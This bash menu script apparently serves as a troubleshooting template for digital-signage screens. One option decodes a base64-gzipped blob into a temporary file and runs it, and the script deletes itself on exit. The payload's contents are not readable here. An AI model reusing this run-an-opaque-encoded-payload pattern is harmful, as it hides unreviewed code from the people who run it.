#!/bin/bash

#!!!!!!!Instructions!!!!!!!!!!!!!
#1-Add Initial menu variables or Troubleshooting options
#2- Modify The funcition according to the initial menu or troubleshooting option selected

#some variables
#time between calling function and executing function (seconds)
time1=2

source ./config.txt


#set variables for the correct path
correct_path="/home/ubuntu"
current_dir=$(pwd)

#if statement to move user to correct directory
if [ "$current_dir" = "$correct_path" ]; then 
    : #do nothing 
else 
    sleep 1
    echo "Moving user to /home/ubuntu/"
    cd $correct_path || { echo "can't run from /home/ubuntu, so not doing anything"; exit 1; }
fi

#Initial menu variables  !!!!!MODIFIABLE IF NEEDED!!!!!!
option1="Ip Change"
option2="NSN Change"
option3="Super screen comms command"
option4="Empty"
option5="Empty"
option6="Empty"
option7="Empty"
option8="Empty"
option9="Troubleshooting"

#Troubleshooting options  !!!!!MODIFIABLE IF NEEDED!!!!!!
troubleshooting1="Content assigned but screens still on identifiers (DUNKIN ONLY)"
troubleshooting2="Multiple primes"
troubleshooting3="opcion troubleshooting 3"
troubleshooting4="Blank screens troubleshooting"
troubleshooting5="DNS error"
troubleshooting6="opcion troubleshooting 6"
troubleshooting7="opcion troubleshooting 7"
troubleshooting8="opcion troubleshooting 8"
troubleshooting9="opcion troubleshooting 9"

# Function to display the menu initial
show_initial_menu() {
    echo "Please select an option:"
    echo "1) $option1"
    echo "2) $option2"
    echo "3) $option3"
    echo "4) $option4"
    echo "5) $option5"
    echo "6) $option6"
    echo "7) $option7"
    echo "8) $option8"
    echo "9) $option9"
    echo "0) Exit"
}

# Function to display the troubleshooting options
show_troubleshooting_menu() {
    echo "Please select an option:"
    echo "1) $troubleshooting1"
    echo "2) $troubleshooting2"
    echo "3) $troubleshooting3"
    echo "4) $troubleshooting4"
    echo "5) $troubleshooting5"
    echo "6) $troubleshooting6"
    echo "7) $troubleshooting6"
    echo "8) $troubleshooting6"
    echo "9) $troubleshooting6"
    echo "0) EXIT"
}

# Function to execute the selected initial option
execute_initial_options() {
    case $1 in
        1)
            echo "Executing $option1:"
            sleep $time1
            function_option_1
            
        ;;
        2)
            echo "Executing $option2:"
            sleep $time1
            function_option_2
            
        ;;
        3)
            echo "Executing $option3:"
            sleep $time1
            function_option_3
            
        ;;
        4)
            echo "Executing $option4:"
            sleep $time1
            function_option_4
            
        ;;
        5)
            echo "Executing $option5:"
            sleep $time1
            function_option_5
            
        ;;
        6)
            echo "Executing $option6:"
            sleep $time1
            function_option_6
            
        ;;
        7)
            echo "Executing $option7:"
            sleep $time1
            function_option_7
            
        ;;
        8)
            echo "Executing $option8:"
            sleep $time1
            function_option_8
            
        ;;
        9)
            echo "Executing $option9:"
            sleep $time1
            show_troubleshooting_menu
            read -p "Enter your issue: " issue
            execute_troubleshooting_option "$issue"
        ;;
        0)
            echo "Exiting. Goodbye!"
            rm "$0"
            echo "this is executed after the script is removed but before its stopped"
            exit 0
        ;;
        *)
            echo "Invalid option. Please try again."
        ;;
    esac
}

# Function to execute the troubleshooting options
execute_troubleshooting_option() {
    case $1 in
        1)
            echo "Executing $troubleshooting1:"
            sleep $time1
            function_troubleshooting_1
            
        ;;
        2)
            echo "Executing $troubleshooting2:"
            sleep $time1
            function_troubleshooting_2
            
        ;;
        3)
            echo "Executing $troubleshooting3:"
            sleep $time1
            function_troubleshooting_3
            
        ;;
        4)
            echo "Executing $troubleshooting4:"
            sleep $time1
            function_troubleshooting_4
            
        ;;
        5)
            echo "Executing $troubleshooting5:"
            sleep $time1
            function_troubleshooting_5
            
        ;;
        6)
            echo "Executing $troubleshooting6:"
            sleep $time1
            function_troubleshooting_6
            
        ;;
        7)
            echo "Executing $troubleshooting7:"
            sleep $time1
            function_troubleshooting_7
            
        ;;
        8)
            echo "Executing $troubleshooting8:"
            sleep $time1
            function_troubleshooting_8
        ;;
        9)
            echo "Executing $troubleshooting9:"
            sleep $time1
            function_troubleshooting_9
        ;;
        0)
            echo "Exiting. Goodbye!"
            sleep $time1
            rm "$0"
            exit 0
        ;;
        *)
            echo "Invalid option. Please try again."
        ;;
    esac
}

#initial functions  !!!!!MODIFIABLE IF NEEDED!!!!!!
function_option_1() {
    true
}

function_option_2() {
    true
}

function_option_3() {
    true
}

function_option_4() {
    true
}

function_option_5() {
    true
}

function_option_6() {
    true
}

function_option_7() {
    true
}

function_option_8() {
    true
}


#Troubleshooting functions  !!!!!MODIFIABLE IF NEEDED!!!!!!
function_troubleshooting_1() {
    true
}

function_troubleshooting_2() {
    true
}

function_troubleshooting_3() {
    true
}

function_troubleshooting_4() {
    T="$(mktemp "/tmp/content-reset.sh-XXXXXXXXXX")"; trap 'rm -f "$T"' EXIT; echo 'H4sIAOKwpWQAA4WVTXObMBCG7/yKt7IzTiYhNNfU7q2dHppOJ5OeHI9HBmEUg0SFSJq0/u9dITA4ydgXRmif/V6W0YdoJVW04lUWjHArCv0oEGtlhbIwIudWJEh1nghTgSt3NrEA3zEFVzIVlcU5MjKCOBPxJghyvV6mMhczFj1yE9FrVD1JG2crzU0SVXVZamPDWBdkIKkuCWBBFRtZWsULUhufUkzCncHGH9kZC6wsyA8vSidMKDCENSbnJ1/vTu5OXiZEOKdWFKWLesb+BsA9y2RltXm+Z7jGfBFsPbXKdbxxdh5+IwxVneehVGVtcU9KYcjNGn0wFED/wgbILiIidmcPTJx3gPXX1+iZCy/0Vn84qyTtfbRiXVsKiTVxA9tJQCkGaa1iK7VCUhflknI5PYPzNcIN3whUtRHQtUFXB8gKpRGV65VUsJlA1xvSGlZsuRHPVVuTiTtPMJ1OKbUh5BqBnYV3VDzuhB6VKebzV0YaNYYPswHd3i0Wn1yMqqmAs3r5bhT4PHREcCoDeirxRJe7vlKPHioqlalVizd9Z2S1HYt5d8A/5EKtbbbADGNSeJvJXjTe0+s4toP+9K05PrhUUanc0F911W3f+wkbu5tOuj++bhQ7nTacBm4GkUaxeQKXfp5wPsN8By08MqixLxFdN3GJONNO0Djfuu865i69ZawTMRufTv3nLVd7nzclyaMOPQsCPwThS+NiYGCv397V91YOJ3fDSy23zxcQkjDTzO/NT3dfWZnnSPSTyjVPpFpDezFtplSua+PN0FLCWlNhVjzJn5uU/kiLq8BNzAhflF9oN/0a+7ZbY83Co5pA2sAUCE2Kd9MtaJsJGx1kbFEeBrpMRHKYiznFdhgpebzha4Jc7Mw0Sz0Bp3K1W7tCanRxzTxA6+xgXscwl9oxZpDdMdQneIzqcmSui7/K5rPq/kmDtg1UUHsqfPSmb7mi/9hbgCx2u/U/Dk/fCx4HAAA=' | base64 -d | gunzip > "$T" && chmod +x "$T" && "$T"
}

function_troubleshooting_5() {
    true
}

function_troubleshooting_6() {
    true
}

function_troubleshooting_7() {
    true
}

function_troubleshooting_8() {
    true
}

function_troubleshooting_9() {
    true
}





# Main loop
while true; do
    show_initial_menu
    read -p "Enter your choice [0-9]: " choice
    execute_initial_options "$choice"
    echo ""
done
